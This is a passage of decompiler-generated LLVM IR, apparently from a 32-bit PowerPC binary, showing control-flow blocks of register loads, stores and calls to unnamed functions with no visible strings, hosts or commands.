  %v2_10000a6c = call i32 @function_100074dc(i8* %v1_10000a6c)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a6c, i32* %r29.global-to-local, align 4
  store i32 35, i32* %r3.global-to-local, align 4
  store i32 268438144, i32* %lr.global-to-local, align 4
  %v3_10000a7c = call i32 @function_10006bb0(i32 35, i32* null)
  store i32 %v3_10000a7c, i32* %r4.global-to-local, align 4
  %v0_10000a84 = load i32, i32* %r22.global-to-local, align 4
  %v1_10000a84 = load i32, i32* %r29.global-to-local, align 4
  %v2_10000a84 = add i32 %v1_10000a84, %v0_10000a84
  store i32 %v2_10000a84, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000a8c.34 to i32), i32* %lr.global-to-local, align 4
  %v2_10000a88 = inttoptr i32 %v2_10000a84 to i8*
  %v3_10000a88 = call i32 @function_10007504(i8* %v2_10000a88, i32 %v3_10000a7c)
  store i32 35, i32* %r3.global-to-local, align 4
  store i32 268438164, i32* @lr, align 4
  %v1_10000a90 = call i32 @function_10006bd8(i32 35)
  %v0_10000a94 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000a94, i32* %r3.global-to-local, align 4
  store i32 268438172, i32* @lr, align 4
  %v1_10000a98 = inttoptr i32 %v0_10000a94 to i8*
  %v2_10000a98 = call i32 @function_100074dc(i8* %v1_10000a98)
  %v0_10000a9c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000a9c, i32* %r4.global-to-local, align 4
  %v0_10000aa0 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000aa0 = add i32 %v0_10000aa0, %v2_10000a98
  store i32 %v2_10000aa0, i32* @r3, align 4
  store i32 268438184, i32* %lr.global-to-local, align 4
  %v3_10000aa4 = inttoptr i32 %v2_10000aa0 to i8*
  %v4_10000aa4 = call i32 @function_10007504(i8* %v3_10000aa4, i32 %v0_10000a9c)
  %v0_10000aa8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000aa8, i32* %r3.global-to-local, align 4
  store i32 268438192, i32* @lr, align 4
  %v1_10000aac = inttoptr i32 %v0_10000aa8 to i8*
  %v2_10000aac = call i32 @function_100074dc(i8* %v1_10000aac)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000aac, i32* %r29.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 268438208, i32* %lr.global-to-local, align 4
  %v3_10000abc = call i32 @function_10006bb0(i32 40, i32* null)
  store i32 %v3_10000abc, i32* %r4.global-to-local, align 4
  %v0_10000ac4 = load i32, i32* %r22.global-to-local, align 4
  %v1_10000ac4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10000ac4 = add i32 %v1_10000ac4, %v0_10000ac4
  store i32 %v2_10000ac4, i32* @r3, align 4
  store i32 268438220, i32* %lr.global-to-local, align 4
  %v2_10000ac8 = inttoptr i32 %v2_10000ac4 to i8*
  %v3_10000ac8 = call i32 @function_10007504(i8* %v2_10000ac8, i32 %v3_10000abc)
  %v0_10000acc = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000acc, i32* %r3.global-to-local, align 4
  store i32 268438228, i32* @lr, align 4
  %v1_10000ad0 = inttoptr i32 %v0_10000acc to i8*
  %v2_10000ad0 = call i32 @function_100074dc(i8* %v1_10000ad0)
  %v0_10000ad4 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_10000ad4, i32* %r4.global-to-local, align 4
  %v0_10000ad8 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000ad8 = add i32 %v0_10000ad8, %v2_10000ad0
  store i32 %v2_10000ad8, i32* @r3, align 4
  store i32 268438240, i32* %lr.global-to-local, align 4
  %v2_10000adc = inttoptr i32 %v2_10000ad8 to i8*
  %v3_10000adc = call i32 @function_10007504(i8* %v2_10000adc, i32 %v0_10000ad4)
  store i32 %v3_10000adc, i32* %r3.global-to-local, align 4
  %v0_10000ae0 = load i32, i32* @r1, align 4
  %v1_10000ae0 = add i32 %v0_10000ae0, 20804
  %v2_10000ae0 = inttoptr i32 %v1_10000ae0 to i32*
  %v3_10000ae0 = load i32, i32* %v2_10000ae0, align 4
  store i32 %v3_10000ae0, i32* %r3.global-to-local, align 4
  store i32 268438248, i32* @lr, align 4
  %v1_10000ae4 = inttoptr i32 %v3_10000ae0 to i8*
  %v2_10000ae4 = call i32 @function_100074dc(i8* %v1_10000ae4)
  store i32 %v2_10000ae4, i32* %r29.global-to-local, align 4
  %v0_10000aec = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000aec, i32* %r3.global-to-local, align 4
  store i32 268438260, i32* @lr, align 4
  %v1_10000af0 = inttoptr i32 %v0_10000aec to i8*
  %v2_10000af0 = call i32 @function_100074dc(i8* %v1_10000af0)
  store i32 10, i32* %r4.global-to-local, align 4
  %v0_10000af8 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000af8 = add i32 %v0_10000af8, %v2_10000af0
  %v0_10000afc = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000afc, i32* %r3.global-to-local, align 4
  store i32 268438276, i32* %lr.global-to-local, align 4
  %v3_10000b00 = trunc i32 %v0_10000afc to i8
  %v4_10000b00 = call i32 @function_10007a3c(i8 %v3_10000b00, i32 10, i32 %v2_10000af8)
  %v0_10000b04 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000b04, i32* %r3.global-to-local, align 4
  store i32 268438284, i32* @lr, align 4
  %v1_10000b08 = inttoptr i32 %v0_10000b04 to i8*
  %v2_10000b08 = call i32 @function_100074dc(i8* %v1_10000b08)
  %v0_10000b0c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000b0c, i32* %r4.global-to-local, align 4
  %v0_10000b10 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000b10 = add i32 %v0_10000b10, %v2_10000b08
  store i32 %v2_10000b10, i32* @r3, align 4
  store i32 268438296, i32* %lr.global-to-local, align 4
  %v3_10000b14 = inttoptr i32 %v2_10000b10 to i8*
  %v4_10000b14 = call i32 @function_10007504(i8* %v3_10000b14, i32 %v0_10000b0c)
  store i32 %v4_10000b14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000b18

dec_label_pc_10000b18:                            ; preds = %dec_label_pc_100008b0, %dec_label_pc_10000a60
  %v0_10000b18 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000b18 = add i32 %v0_10000b18, 1468
  %v2_10000b18 = inttoptr i32 %v1_10000b18 to i32*
  %v3_10000b18 = load i32, i32* %v2_10000b18, align 4
  store i32 %v3_10000b18, i32* %r0.global-to-local, align 4
  %v1_10000b1c = icmp slt i32 %v3_10000b18, 0
  %v2_10000b1c = icmp sgt i32 %v3_10000b18, 0
  %v3_10000b1c = icmp eq i32 %v3_10000b18, 0
  store i1 %v1_10000b1c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000b1c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000b1c, i1* %cr7_eq.global-to-local, align 1
  %tmp69 = icmp slt i32 %v3_10000b18, 1
  br i1 %tmp69, label %dec_label_pc_10000bb8, label %dec_label_pc_10000b24

dec_label_pc_10000b24:                            ; preds = %dec_label_pc_10000b18
  %v0_10000b24 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000b24, i32* %r3.global-to-local, align 4
  store i32 268438316, i32* @lr, align 4
  %v1_10000b28 = inttoptr i32 %v0_10000b24 to i8*
  %v2_10000b28 = call i32 @function_100074dc(i8* %v1_10000b28)
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10000b30 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000b30 = add i32 %v0_10000b30, %v2_10000b28
  store i32 %v2_10000b30, i32* @r3, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000a7c0.35 to i32), i32* %r4.global-to-local, align 4
  store i32 268438332, i32* %lr.global-to-local, align 4
  %v3_10000b38 = inttoptr i32 %v2_10000b30 to i8*
  %v4_10000b38 = call i32 @function_10007504(i8* %v3_10000b38, i32 ptrtoint ([9 x i8]* @global_var_1000a7c0.35 to i32))
  store i32 %v4_10000b38, i32* %r3.global-to-local, align 4
  %v0_10000b3c = load i32, i32* %r30.global-to-local, align 4
  %v1_10000b3c = add i32 %v0_10000b3c, 1468
  %v2_10000b3c = inttoptr i32 %v1_10000b3c to i32*
  %v3_10000b3c = load i32, i32* %v2_10000b3c, align 4
  store i32 %v3_10000b3c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10000b44 = icmp slt i32 %v3_10000b3c, 0
  %v2_10000b44 = icmp sgt i32 %v3_10000b3c, 0
  %v3_10000b44 = icmp eq i32 %v3_10000b3c, 0
  store i1 %v1_10000b44, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000b44, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000b44, i1* %cr7_eq.global-to-local, align 1
  %v1_10000b48 = load i32, i32* @r1, align 4
  %v2_10000b48 = add i32 %v1_10000b48, 8
  %v3_10000b48 = inttoptr i32 %v2_10000b48 to i32*
  store i32 0, i32* %v3_10000b48, align 4
  %tmp70 = icmp slt i32 %v3_10000b3c, 1
  br i1 %tmp70, label %dec_label_pc_10000ba0, label %dec_label_pc_10000b50

dec_label_pc_10000b50:                            ; preds = %dec_label_pc_10000b24, %dec_label_pc_10000b50
  %v0_10000b50 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000b50, i32* %r3.global-to-local, align 4
  store i32 268438360, i32* @lr, align 4
  %v1_10000b54 = inttoptr i32 %v0_10000b50 to i8*
  %v2_10000b54 = call i32 @function_100074dc(i8* %v1_10000b54)
  store i32 %v2_10000b54, i32* %r3.global-to-local, align 4
  %v0_10000b58 = load i32, i32* @r1, align 4
  %v1_10000b58 = add i32 %v0_10000b58, 8
  %v2_10000b58 = inttoptr i32 %v1_10000b58 to i32*
  %v3_10000b58 = load i32, i32* %v2_10000b58, align 4
  %v0_10000b5c = load i32, i32* %r22.global-to-local, align 4
  %v2_10000b5c = add i32 %v0_10000b5c, %v2_10000b54
  store i32 %v2_10000b5c, i32* @r3, align 4
  %v1_10000b60 = mul i32 %v3_10000b58, 128
  %v1_10000b64 = add i32 %v1_10000b60, 1472
  %v0_10000b68 = load i32, i32* %r30.global-to-local, align 4
  %v2_10000b68 = add i32 %v1_10000b64, %v0_10000b68
  store i32 %v2_10000b68, i32* %r4.global-to-local, align 4
  store i32 268438384, i32* %lr.global-to-local, align 4
  %v2_10000b6c = inttoptr i32 %v2_10000b5c to i8*
  %v3_10000b6c = call i32 @function_10007504(i8* %v2_10000b6c, i32 %v2_10000b68)
  %v0_10000b70 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000b70, i32* %r3.global-to-local, align 4
  store i32 268438392, i32* @lr, align 4
  %v1_10000b74 = inttoptr i32 %v0_10000b70 to i8*
  %v2_10000b74 = call i32 @function_100074dc(i8* %v1_10000b74)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a7cc.36 to i32), i32* %r4.global-to-local, align 4
  %v0_10000b80 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000b80 = add i32 %v0_10000b80, %v2_10000b74
  store i32 %v2_10000b80, i32* @r3, align 4
  store i32 268438408, i32* %lr.global-to-local, align 4
  %v3_10000b84 = inttoptr i32 %v2_10000b80 to i8*
  %v4_10000b84 = call i32 @function_10007504(i8* %v3_10000b84, i32 ptrtoint ([3 x i8]* @global_var_1000a7cc.36 to i32))
  store i32 %v4_10000b84, i32* %r3.global-to-local, align 4
  %v0_10000b88 = load i32, i32* @r1, align 4
  %v1_10000b88 = add i32 %v0_10000b88, 8
  %v2_10000b88 = inttoptr i32 %v1_10000b88 to i32*
  %v3_10000b88 = load i32, i32* %v2_10000b88, align 4
  store i32 %v3_10000b88, i32* %r9.global-to-local, align 4
  %v0_10000b8c = load i32, i32* %r30.global-to-local, align 4
  %v1_10000b8c = add i32 %v0_10000b8c, 1468
  %v2_10000b8c = inttoptr i32 %v1_10000b8c to i32*
  %v3_10000b8c = load i32, i32* %v2_10000b8c, align 4
  store i32 %v3_10000b8c, i32* %r0.global-to-local, align 4
  %v1_10000b90 = add i32 %v3_10000b88, 1
  store i32 %v1_10000b90, i32* %r11.global-to-local, align 4
  %v2_10000b94 = icmp slt i32 %v3_10000b8c, %v1_10000b90
  %v3_10000b94 = icmp sgt i32 %v3_10000b8c, %v1_10000b90
  %v4_10000b94 = icmp eq i32 %v3_10000b8c, %v1_10000b90
  store i1 %v2_10000b94, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000b94, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000b94, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10000b90, i32* %v2_10000b88, align 4
  br i1 %v3_10000b94, label %dec_label_pc_10000b50, label %dec_label_pc_10000ba0

dec_label_pc_10000ba0:                            ; preds = %dec_label_pc_10000b50, %dec_label_pc_10000b24
  %v0_10000ba0 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000ba0, i32* %r3.global-to-local, align 4
  store i32 268438440, i32* @lr, align 4
  %v1_10000ba4 = inttoptr i32 %v0_10000ba0 to i8*
  %v2_10000ba4 = call i32 @function_100074dc(i8* %v1_10000ba4)
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10000bac = load i32, i32* %r22.global-to-local, align 4
  %v2_10000bac = add i32 %v0_10000bac, %v2_10000ba4
  store i32 %v2_10000bac, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32), i32* %r4.global-to-local, align 4
  store i32 268438456, i32* %lr.global-to-local, align 4
  %v3_10000bb4 = inttoptr i32 %v2_10000bac to i8*
  %v4_10000bb4 = call i32 @function_10007504(i8* %v3_10000bb4, i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32))
  store i32 %v4_10000bb4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000bb8

dec_label_pc_10000bb8:                            ; preds = %dec_label_pc_10000b18, %dec_label_pc_10000ba0
  %v0_10000bb8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000bb8, i32* %r3.global-to-local, align 4
  store i32 268438464, i32* @lr, align 4
  %v1_10000bbc = inttoptr i32 %v0_10000bb8 to i8*
  %v2_10000bbc = call i32 @function_100074dc(i8* %v1_10000bbc)
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10000bc4 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000bc4 = add i32 %v0_10000bc4, %v2_10000bbc
  store i32 %v2_10000bc4, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32), i32* %r4.global-to-local, align 4
  store i32 268438480, i32* %lr.global-to-local, align 4
  %v3_10000bcc = inttoptr i32 %v2_10000bc4 to i8*
  %v4_10000bcc = call i32 @function_10007504(i8* %v3_10000bcc, i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32))
  store i32 %v4_10000bcc, i32* %r3.global-to-local, align 4
  %v0_10000bd0 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10000bd0, label %dec_label_pc_10000be8, label %dec_label_pc_10000bd4

dec_label_pc_10000bd4:                            ; preds = %dec_label_pc_10000bb8
  %v0_10000bd4 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000bd4, i32* %r3.global-to-local, align 4
  store i32 268438492, i32* @lr, align 4
  %v1_10000bd8 = inttoptr i32 %v0_10000bd4 to i8*
  %v2_10000bd8 = call i32 @function_100074dc(i8* %v1_10000bd8)
  store i32 %v2_10000bd8, i32* %r3.global-to-local, align 4
  %v0_10000bdc = load i32, i32* @r1, align 4
  %v1_10000bdc = add i32 %v0_10000bdc, 20804
  %v2_10000bdc = inttoptr i32 %v1_10000bdc to i32*
  %v3_10000bdc = load i32, i32* %v2_10000bdc, align 4
  store i32 %v3_10000bdc, i32* %r4.global-to-local, align 4
  %v0_10000be0 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000be0 = add i32 %v0_10000be0, %v2_10000bd8
  store i32 %v2_10000be0, i32* @r3, align 4
  store i32 268438504, i32* %lr.global-to-local, align 4
  %v2_10000be4 = inttoptr i32 %v2_10000be0 to i8*
  %v3_10000be4 = call i32 @function_10007504(i8* %v2_10000be4, i32 %v3_10000bdc)
  store i32 %v3_10000be4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000be8

dec_label_pc_10000be8:                            ; preds = %dec_label_pc_10000bb8, %dec_label_pc_10000bd4
  %v0_10000be8 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000be8 = add i32 %v0_10000be8, 1440
  store i32 %v1_10000be8, i32* @r31, align 4
  %v0_10000bec = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10000bec, i32* %r3.global-to-local, align 4
  store i32 %v1_10000be8, i32* %r4.global-to-local, align 4
  store i32 268438520, i32* %lr.global-to-local, align 4
  %v2_10000bf4 = inttoptr i32 %v0_10000bec to i8*
  %v3_10000bf4 = call i32 @function_10007938(i8* %v2_10000bf4, i32 %v1_10000be8)
  store i32 %v3_10000bf4, i32* %r3.global-to-local, align 4
  %v1_10000bf8 = icmp slt i32 %v3_10000bf4, 0
  %v2_10000bf8 = icmp sgt i32 %v3_10000bf4, 0
  %v3_10000bf8 = icmp eq i32 %v3_10000bf4, 0
  store i1 %v1_10000bf8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000bf8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000bf8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000bf8, label %dec_label_pc_10001508, label %dec_label_pc_10000c00

dec_label_pc_10000c00:                            ; preds = %dec_label_pc_10000be8, %dec_label_pc_10001508
  %v0_10000c00 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000c00 = inttoptr i32 %v0_10000c00 to i32*
  %v2_10000c00 = load i32, i32* %v1_10000c00, align 4
  store i32 %v2_10000c00, i32* %r29.global-to-local, align 4
  %v0_10000c04 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000c04, i32* %r3.global-to-local, align 4
  store i32 268438540, i32* @lr, align 4
  %v1_10000c08 = inttoptr i32 %v0_10000c04 to i8*
  %v2_10000c08 = call i32 @function_100074dc(i8* %v1_10000c08)
  %v0_10000c0c = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000c0c, i32* %r4.global-to-local, align 4
  %v0_10000c18 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000c18, i32* %r3.global-to-local, align 4
  store i32 268438560, i32* @lr, align 4
  %v4_10000c1c = call i32 @function_10008a80(i32 %v0_10000c18, i32 %v0_10000c0c, i32 %v2_10000c08, i32 16384)
  store i32 %v4_10000c1c, i32* %r3.global-to-local, align 4
  %v0_10000c20 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000c20 = inttoptr i32 %v0_10000c20 to i32*
  %v2_10000c20 = load i32, i32* %v1_10000c20, align 4
  %v0_10000c24 = load i32, i32* %r25.global-to-local, align 4
  %v2_10000c24 = add i32 %v0_10000c20, 12
  %v3_10000c24 = inttoptr i32 %v2_10000c24 to i32*
  store i32 %v0_10000c24, i32* %v3_10000c24, align 4
  %v1_10000c28 = call i32 @__asm_rlwinm(i32 %v2_10000c20, i32 29, i32 3, i32 29)
  %v0_10000c2c = load i32, i32* %r26.global-to-local, align 4
  %v2_10000c2c = icmp slt i32 %v0_10000c2c, %v2_10000c20
  %v3_10000c2c = icmp sgt i32 %v0_10000c2c, %v2_10000c20
  %v4_10000c2c = icmp eq i32 %v0_10000c2c, %v2_10000c20
  store i1 %v2_10000c2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000c2c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000c2c, i1* %cr7_eq.global-to-local, align 1
  %v1_10000c30 = load i32, i32* %r18.global-to-local, align 4
  %v2_10000c30 = add i32 %v1_10000c30, %v1_10000c28
  store i32 %v2_10000c30, i32* %r11.global-to-local, align 4
  %v1_10000c34 = urem i32 %v2_10000c20, 32
  store i32 %v1_10000c34, i32* %r0.global-to-local, align 4
  %v1_10000c38 = add i32 %v2_10000c30, 36
  %v2_10000c38 = inttoptr i32 %v1_10000c38 to i32*
  %v3_10000c38 = load i32, i32* %v2_10000c38, align 4
  %v0_10000c3c = load i32, i32* %r23.global-to-local, align 4
  %v3_10000c3c = shl i32 %v0_10000c3c, %v1_10000c34
  %v2_10000c40 = or i32 %v3_10000c3c, %v3_10000c38
  store i32 %v2_10000c40, i32* %r9.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  store i32 %v2_10000c40, i32* %v2_10000c38, align 4
  %v0_10000c4c = load i32, i32* %r0.global-to-local, align 4
  %v1_10000c4c = trunc i32 %v0_10000c4c to i8
  %v2_10000c4c = load i32, i32* %r30.global-to-local, align 4
  %v3_10000c4c = add i32 %v2_10000c4c, 4
  %v4_10000c4c = inttoptr i32 %v3_10000c4c to i8*
  store i8 %v1_10000c4c, i8* %v4_10000c4c, align 1
  %v0_10000c50 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10000c50 = load i1, i1* %cr7_gt.global-to-local, align 1
  %v2_10000c50 = or i1 %v0_10000c50, %v1_10000c50
  br i1 %v2_10000c50, label %dec_label_pc_10000678, label %dec_label_pc_10000c54

dec_label_pc_10000c54:                            ; preds = %dec_label_pc_10000c00
  %v1_10000c54 = add i32 %v2_10000c20, 1
  store i32 %v1_10000c54, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000784

dec_label_pc_10000c5c:                            ; preds = %dec_label_pc_10000660, %dec_label_pc_10000658, %dec_label_pc_10000650
  %v1_10000c5c = inttoptr i32 %v2_10000c8c to i32*
  %v2_10000c5c = load i32, i32* %v1_10000c5c, align 4
  %v1_10000c60 = call i32 @__asm_rlwinm(i32 %v2_10000c5c, i32 29, i32 3, i32 29)
  %v0_10000c64 = load i32, i32* %r26.global-to-local, align 4
  %v2_10000c64 = icmp slt i32 %v0_10000c64, %v2_10000c5c
  %v3_10000c64 = icmp sgt i32 %v0_10000c64, %v2_10000c5c
  %v4_10000c64 = icmp eq i32 %v0_10000c64, %v2_10000c5c
  store i1 %v2_10000c64, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000c64, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000c64, i1* %cr7_eq.global-to-local, align 1
  %v1_10000c68 = load i32, i32* %r18.global-to-local, align 4
  %v2_10000c68 = add i32 %v1_10000c68, %v1_10000c60
  store i32 %v2_10000c68, i32* %r11.global-to-local, align 4
  %v1_10000c6c = urem i32 %v2_10000c5c, 32
  store i32 %v1_10000c6c, i32* %r0.global-to-local, align 4
  %v1_10000c70 = add i32 %v2_10000c68, 36
  %v2_10000c70 = inttoptr i32 %v1_10000c70 to i32*
  %v3_10000c70 = load i32, i32* %v2_10000c70, align 4
  %v0_10000c74 = load i32, i32* %r23.global-to-local, align 4
  %v3_10000c74 = shl i32 %v0_10000c74, %v1_10000c6c
  store i32 %v3_10000c74, i32* %r0.global-to-local, align 4
  %v2_10000c78 = or i32 %v3_10000c74, %v3_10000c70
  store i32 %v2_10000c78, i32* %r9.global-to-local, align 4
  store i32 %v2_10000c78, i32* %v2_10000c70, align 4
  br i1 %v2_10000c64, label %dec_label_pc_10000c84, label %dec_label_pc_10000678

dec_label_pc_10000c84:                            ; preds = %dec_label_pc_10000c5c
  %v1_10000c84 = add i32 %v2_10000c5c, 1
  store i32 %v1_10000c84, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000784

dec_label_pc_10000c8c:                            ; preds = %dec_label_pc_1000089c
  store i8 0, i8* %v2_10000688, align 1
  %v0_1000069c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000069c

dec_label_pc_10000c94:                            ; preds = %dec_label_pc_10000640
  %v1_10000c94 = add i32 %v2_10000c8c, 8
  %v2_10000c94 = inttoptr i32 %v1_10000c94 to i32*
  %v3_10000c94 = load i32, i32* %v2_10000c94, align 4
  %v1_10000c98 = load i32, i32* %r25.global-to-local, align 4
  %v2_10000c98 = sub i32 %v1_10000c98, %v3_10000c94
  store i32 %v2_10000c98, i32* %r0.global-to-local, align 4
  %v1_10000c9c = icmp ult i32 %v2_10000c98, 30
  %v2_10000c9c = icmp ugt i32 %v2_10000c98, 30
  %v3_10000c9c = icmp eq i32 %v2_10000c98, 30
  store i1 %v1_10000c9c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000c9c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000c9c, i1* %cr7_eq.global-to-local, align 1
  %tmp72 = icmp ult i32 %v2_10000c98, 31
  br i1 %tmp72, label %dec_label_pc_10000758, label %dec_label_pc_10000668

dec_label_pc_10000ca8:                            ; preds = %dec_label_pc_10000808
  %v0_10000ca8 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000ca8, i32* @r3, align 4
  store i32 10240, i32* @r4, align 4
  store i32 268438708, i32* @lr, align 4
  %v0_10000cb0 = call i32 @function_10007584()
  store i32 %v0_10000cb0, i32* %r3.global-to-local, align 4
  %v0_10000cb4 = load i32, i32* @r30, align 4
  %v1_10000cb4 = add i32 %v0_10000cb4, -533
  %v2_10000cb4 = inttoptr i32 %v1_10000cb4 to i32*
  %v3_10000cb4 = load i32, i32* %v2_10000cb4, align 4
  store i32 %v3_10000cb4, i32* %r3.global-to-local, align 4
  %v0_10000cb8 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000cb8, i32* %r4.global-to-local, align 4
  store i32 268438728, i32* @lr, align 4
  %v4_10000cc4 = call i32 @function_10008a08(i32 %v3_10000cb4, i32 %v0_10000cb8, i32 10240, i32 16386)
  store i32 %v4_10000cc4, i32* %r3.global-to-local, align 4
  store i32 %v4_10000cc4, i32* %r24.global-to-local, align 4
  %tmp73 = icmp slt i32 %v4_10000cc4, 1
  br i1 %tmp73, label %dec_label_pc_100018f0, label %dec_label_pc_10000cd0

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000ca8
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10000cd4 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000cd4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000a7d0.37 to i32), i32* @r31, align 4
  store i32 %v4_10000cc4, i32* %r4.global-to-local, align 4
  store i32 268438764, i32* %lr.global-to-local, align 4
  %v5_10000ce8 = call i32 @function_100075a8(i32 %v0_10000cd4, i32 %v4_10000cc4, i32 ptrtoint ([5 x i8]* @global_var_1000a7d0.37 to i32), i32 4)
  store i32 %v5_10000ce8, i32* %r3.global-to-local, align 4
  %v1_10000cec = icmp slt i32 %v5_10000ce8, -1
  %v2_10000cec = icmp sgt i32 %v5_10000ce8, -1
  %v3_10000cec = icmp eq i32 %v5_10000ce8, -1
  store i1 %v1_10000cec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000cec, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000cec, i1* %cr7_eq.global-to-local, align 1
  %v0_100017d4 = load i32, i32* %r24.global-to-local, align 4
  br i1 %v3_10000cec, label %dec_label_pc_100017d4, label %dec_label_pc_10000cf4

dec_label_pc_10000cf4:                            ; preds = %dec_label_pc_10000cd0, %dec_label_pc_100017d4
  %v0_10000cf4 = load i32, i32* @r31, align 4
  store i32 %v0_100017d4, i32* %r4.global-to-local, align 4
  %v0_10000d00 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000d00, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000d08.38 to i32), i32* %lr.global-to-local, align 4
  %v5_10000d04 = call i32 @function_100075a8(i32 %v0_10000d00, i32 %v0_100017d4, i32 %v0_10000cf4, i32 4)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10000d0c = load i32, i32* %r18.global-to-local, align 4
  %v2_10000d0c = add i32 %v0_10000d0c, %v5_10000d04
  store i32 %v2_10000d0c, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_10000d14 = add i32 %v2_10000d0c, 10532
  %v4_10000d14 = inttoptr i32 %v3_10000d14 to i8*
  store i8 0, i8* %v4_10000d14, align 1
  store i32 46, i32* %r3.global-to-local, align 4
  store i32 268438816, i32* %lr.global-to-local, align 4
  %v3_10000d1c = call i32 @function_10006bb0(i32 46, i32* null)
  %v0_10000d20 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000d20, i32* %r4.global-to-local, align 4
  %v0_10000d28 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000d28, i32* %r3.global-to-local, align 4
  store i32 268438832, i32* %lr.global-to-local, align 4
  %v3_10000d2c = inttoptr i32 %v0_10000d28 to i8*
  %v4_10000d2c = call i32 @function_1000788c(i8* %v3_10000d2c, i32 %v0_10000d20, i32 %v3_10000d1c)
  store i32 %v4_10000d2c, i32* %r3.global-to-local, align 4
  %v1_10000d30 = icmp slt i32 %v4_10000d2c, -1
  %v2_10000d30 = icmp sgt i32 %v4_10000d2c, -1
  %v3_10000d30 = icmp eq i32 %v4_10000d2c, -1
  store i1 %v1_10000d30, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000d30, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000d30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000d30, label %dec_label_pc_10000d40, label %dec_label_pc_10000d38

dec_label_pc_10000d38:                            ; preds = %dec_label_pc_10000cf4
